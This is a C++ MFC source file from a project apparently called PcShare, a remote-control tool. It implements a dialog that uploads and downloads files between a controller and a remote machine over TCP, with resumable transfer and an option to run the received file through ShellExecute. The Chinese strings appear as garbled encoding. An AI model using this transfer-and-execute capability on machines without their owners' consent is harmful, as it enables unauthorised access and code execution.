// MyFileDlDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyFileDlDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyFileDlDlg dialog


CMyFileDlDlg::CMyFileDlDlg()
{
	//{{AFX_DATA_INIT(CMyFileDlDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	memset(&m_FileInfo, 0, sizeof(m_FileInfo));
	hDlFilethread = NULL;
	memset(m_Id, 0, 256 * sizeof(TCHAR));
	bIsUserCancel = FALSE;
}

CMyFileDlDlg::~CMyFileDlDlg()
{

}

void CMyFileDlDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyFileDlDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_ANIMATE_FILE, m_Animal);
	DDX_Control(pDX, IDC_PROGRESS_FILE, m_FileStep);
	DDX_Text(pDX, ID_FILE_LOCAL, m_LocalFile);
	DDX_Text(pDX, ID_FILE_REMOTE, m_RemoteFile);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyFileDlDlg, CDialog)
	//{{AFX_MSG_MAP(CMyFileDlDlg)
	ON_WM_COPYDATA()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyFileDlDlg message handlers

BOOL CMyFileDlDlg::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct) 
{
	LPTCPCONNECTINFO pInfo = (LPTCPCONNECTINFO) pCopyDataStruct->lpData;
	if(pCopyDataStruct->dwData == PS_SOCKET_CONNECT)
	{
		if(m_Tran.DuplicateHttpSocket(pInfo))
		{
			hDlFilethread = (HANDLE) _beginthread(DownLoadFileThread, 0, this);
		}
	}	
	return TRUE;
}

BOOL CMyFileDlDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	m_LocalFile = m_FileInfo.m_LocalFile;
	m_RemoteFile = m_FileInfo.m_RemoteFile;
	m_Animal.Open(IDR_AVI_FILE);

	m_FileStep.SetRange32(0, 100);

	UpdateData(FALSE);
	
	MYCHILDCMDINFO m_Info = {0};
	lstrcpy(m_Info.m_Id, m_Id);
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		return FALSE;
	}
	
	HWND hMainListWnd = GetMainListWnd();
	
	if(m_FileInfo.m_IsUpLoad)
	{
		m_Info.m_Info.m_Command = WM_CONNECT_UP_FILE;
		SetWindowText(_T("�����ϴ��ļ��������ƶˡ�����"));
	}
	else
	{
		m_Info.m_Info.m_Command = WM_CONNECT_DL_FILE;
		SetWindowText(_T("���������ļ������ء�����"));
	}

	//ȡ��ǰ����
	m_Info.m_Info.m_Hwnd = GetSafeHwnd();
	
	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = &m_Info;
	ct.cbData = sizeof(MYCHILDCMDINFO);
	ct.dwData = PS_LOCAL_FILETRAN;
	::SendMessage(hMainListWnd, WM_COPYDATA, 0, (LPARAM) &ct);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

BOOL CMyFileDlDlg::Create(CWnd* pParentWnd, LPCTSTR pId, LPINTERFILEINFO pInfo) 
{
	lstrcpy(m_Id, pId);
	memcpy(&m_FileInfo, pInfo, sizeof(INTERFILEINFO));
	return CDialog::Create(IDD, pParentWnd);
}

void CMyFileDlDlg::ReNameFileName(TCHAR* pFileName, BOOL bIsBakFileName)
{
	if(bIsBakFileName)
	{
		RemoveDirectory(pFileName);
		lstrcat(pFileName, _T(".bak"));
	}
	else
	{
		//����
		TCHAR m_NewName[256] = {0};
		lstrcpy(m_NewName, pFileName);
		m_NewName[lstrlen(m_NewName) - 4] = 0x00;
		MoveFileEx(pFileName, m_NewName, MOVEFILE_COPY_ALLOWED);
	}
}

void CMyFileDlDlg::DownLoadFile()
{
	TCHAR m_LogsText[256];
	LARGE_INTEGER nTransLen = {0};

	//����Ŀ¼
	MakeFilePath(m_FileInfo.m_LocalFile);

	BOOL m_IsReName = FALSE;
	if(m_FileInfo.m_LocalFile[lstrlen(m_FileInfo.m_LocalFile) - 4] != _T('.'))
	{
		m_IsReName = TRUE;
		ReNameFileName(m_FileInfo.m_LocalFile, TRUE);
	}

	//���ļ�
	HANDLE hFile = CreateFile(
				m_FileInfo.m_LocalFile,  
				GENERIC_WRITE,   
				0, 
				NULL,           
				OPEN_ALWAYS,      
				FILE_ATTRIBUTE_NORMAL, 
				NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		wsprintf(m_LogsText, _T("�޷��򿪱����ļ�[%s]����ǰ�������"), m_FileInfo.m_LocalFile);
		MessageBox(m_LogsText);
		return;
	}

	//ȷ�������ļ�����
	GetFileSizeEx(hFile, &m_FileInfo.m_FilePoint);

#ifdef UNICODE
	m_Tran.Convert2ClientANSI(m_FileInfo.m_LocalFile, wcslen(m_FileInfo.m_LocalFile));
	m_Tran.Convert2ClientANSI(m_FileInfo.m_RemoteFile, wcslen(m_FileInfo.m_RemoteFile));
#endif

	if(!m_Tran.TcpSendData(&m_FileInfo, sizeof(m_FileInfo)) || !m_Tran.TcpRecvData(&m_FileInfo, sizeof(m_FileInfo)))
	{
		CloseHandle(hFile);
		if(!bIsUserCancel)
		{
			MessageBox(_T("�����ж�"));
		}
		return;
	}

		// Ϊ�ļ���������Ansi��Unicode��ת�� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
	m_Tran.Convert2Unicode((char*) m_FileInfo.m_LocalFile, strlen((char*) m_FileInfo.m_LocalFile));
	m_Tran.Convert2Unicode((char*) m_FileInfo.m_RemoteFile, strlen((char*) m_FileInfo.m_RemoteFile));
#endif

	//��ʾ��ǰ�ļ�����
	double c = 1.0 * m_FileInfo.m_FilePoint.QuadPart / m_FileInfo.m_FileLen.QuadPart * 100;
	m_FileStep.SetPos((int) c);

	//�鿴������
	if(m_FileInfo.m_Response != 0)
	{
		switch(m_FileInfo.m_Response)
		{
			case DL_FILE_LOSE : 
				{
					wsprintf(m_LogsText, _T("�޷���Զ���ļ�[%s]����ǰ�������"), m_FileInfo.m_RemoteFile);
					MessageBox(m_LogsText);
				}
				break;
			case DL_FILE_LEN_ERR :
				{
					wsprintf(m_LogsText, _T("Զ���ļ������쳣[%s]����ǰ�������"), m_FileInfo.m_RemoteFile);
					MessageBox(m_LogsText);
				}
				break;
			default :
				{
					MessageBox(_T("δ֪���󣬣���ǰ�������"));
				}
				break;
		}

		CloseHandle(hFile);
		return;
	}

	nTransLen.QuadPart = m_FileInfo.m_FileLen.QuadPart - m_FileInfo.m_FilePoint.QuadPart;
	if(nTransLen.QuadPart == 0)
	{
		//��������
		CloseHandle(hFile);

		if(m_IsReName)
		{
			ReNameFileName(m_FileInfo.m_LocalFile, FALSE);
		}

		if(m_FileInfo.m_IsExec)
		{
			ShellExecute(NULL, NULL, m_FileInfo.m_LocalFile, NULL, NULL, SW_SHOW);
		}
		return;
	}

	//�ƶ���ĩβ
	LARGE_INTEGER nPos;
	nPos.QuadPart = 0;
	SetFilePointerEx(hFile, nPos, NULL, FILE_END);

	//�����ļ�ʵ��
	DWORD len = 0;
	BYTE pFileBuf[65535];
	DWORD nRecvLen = 0;
	while(nTransLen.QuadPart > 0)
	{
		len = DWORD (nTransLen.QuadPart > 65535 ? 65535 : nTransLen.QuadPart);
		if(!m_Tran.TcpRecvData(pFileBuf, len))
		{
			CloseHandle(hFile);
			if(!bIsUserCancel)
			{
				MessageBox(_T("�����ж�"));
			}
			return;
		}

		WriteFile(hFile, pFileBuf, len, &nRecvLen, NULL);
		nTransLen.QuadPart -= len;
		m_FileInfo.m_FilePoint.QuadPart += len;

		//��ʾ��ǰ�ļ�����
		double c = 1.0 * m_FileInfo.m_FilePoint.QuadPart / m_FileInfo.m_FileLen.QuadPart * 100;
		m_FileStep.SetPos((int) c);
	}

	//��ǰ�ļ��������
	CloseHandle(hFile);

	if(m_IsReName)
	{
		ReNameFileName(m_FileInfo.m_LocalFile, FALSE);
	}

	if(m_FileInfo.m_IsExec)
	{
		ShellExecute(NULL, NULL, m_FileInfo.m_LocalFile, NULL, NULL, SW_SHOW);
	}
}

void CMyFileDlDlg::UpLoadFile()
{
	TCHAR m_LogsText[256];
	LARGE_INTEGER nTransLen = {0};

	HANDLE hFile = CreateFile(m_FileInfo.m_LocalFile, GENERIC_READ, 
			FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		wsprintf(m_LogsText, _T("�޷��򿪱����ļ�[%s]����ǰ�������"), m_FileInfo.m_LocalFile);
		MessageBox(m_LogsText);
		return;
	}

	GetFileSizeEx(hFile, &m_FileInfo.m_FileLen);

#ifdef UNICODE
	m_Tran.Convert2ClientANSI(m_FileInfo.m_LocalFile, wcslen(m_FileInfo.m_LocalFile));
	m_Tran.Convert2ClientANSI(m_FileInfo.m_RemoteFile, wcslen(m_FileInfo.m_RemoteFile));
#endif

	if(!m_Tran.TcpSendData(&m_FileInfo, sizeof(m_FileInfo)) || !m_Tran.TcpRecvData(&m_FileInfo, sizeof(m_FileInfo)))
	{
		CloseHandle(hFile);
		if(!bIsUserCancel)
		{
			MessageBox(_T("�����ж�"));
		}
		return;
	}

		// Ϊ�ļ���������Ansi��Unicode��ת�� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
	m_Tran.Convert2Unicode((char*)m_FileInfo.m_LocalFile,strlen((char*)m_FileInfo.m_LocalFile));
	m_Tran.Convert2Unicode((char*)m_FileInfo.m_RemoteFile,strlen((char*)m_FileInfo.m_RemoteFile));
#endif

	//�鿴������
	if(m_FileInfo.m_Response != 0)
	{
		switch(m_FileInfo.m_Response)
		{
			case DL_FILE_LOSE : 
				{
					wsprintf(m_LogsText, _T("�޷�����Զ���ļ�[%s]����ǰ�������"), m_FileInfo.m_RemoteFile);
					MessageBox(m_LogsText);
				}
				break;
			case DL_FILE_LEN_ERR :
				{
					wsprintf(m_LogsText, _T("Զ���ļ������쳣[%s]����ǰ�������"), m_FileInfo.m_RemoteFile);
					MessageBox(m_LogsText);
				}
				break;
			default :
				{
					MessageBox(_T("δ֪���󣬣���ǰ�������"));
				}
				break;
		}

		CloseHandle(hFile);
		return;
	}

	//��ʾ��ǰ�ļ�����
	double c = 1.0 * m_FileInfo.m_FilePoint.QuadPart / m_FileInfo.m_FileLen.QuadPart * 100;
	m_FileStep.SetPos((int) c);

	nTransLen.QuadPart = m_FileInfo.m_FileLen.QuadPart - m_FileInfo.m_FilePoint.QuadPart;
	if(nTransLen.QuadPart == 0)
	{
		//��������
		CloseHandle(hFile);
		return;
	}

	//�ƶ����ϵ�λ��
	SetFilePointerEx(hFile, m_FileInfo.m_FilePoint, NULL, FILE_BEGIN);

	//�����ļ�ʵ��
	DWORD len = 0;
	BYTE pFileBuf[65535] = {0};
	DWORD nRecvLen = 0;
	while(nTransLen.QuadPart > 0)
	{
		len = DWORD (nTransLen.QuadPart > 65535 ? 65535 : nTransLen.QuadPart);
		ReadFile(hFile, pFileBuf, len, &nRecvLen, NULL);
		if(!m_Tran.TcpSendData(pFileBuf, len))
		{
			break;
		}

		nTransLen.QuadPart -= len;
		m_FileInfo.m_FilePoint.QuadPart += len;

		//��ʾ��ǰ�ļ�����
		double c = 1.0 * m_FileInfo.m_FilePoint.QuadPart / m_FileInfo.m_FileLen.QuadPart * 100;
		m_FileStep.SetPos((int) c);
	}

	//��ǰ�ļ��������
	CloseHandle(hFile);
}

void CMyFileDlDlg::DownLoadFileThread(LPVOID lPvoid)
{
	SetThreadAffinityMask(GetCurrentThread(), 0x0E);
	CMyFileDlDlg* pThis = (CMyFileDlDlg*) lPvoid;

	if(pThis->m_FileInfo.m_IsUpLoad)
	{
		pThis->UpLoadFile();
	}
	else
	{
		pThis->DownLoadFile();
	}
	
	if(!pThis->bIsUserCancel)
	{
		//֪ͨ������ɾ����ǰ��
		pThis->GetParent()->PostMessage(WM_DL_DELETE_VIEW, (WPARAM) pThis, NULL);
	}
}

void CMyFileDlDlg::OnCancel() 
{
	bIsUserCancel = TRUE;
	m_Tran.Close();
	GetParent()->PostMessage(WM_DL_DELETE_VIEW, (WPARAM) this, NULL);
}

void CMyFileDlDlg::OnOK() 
{
	
}

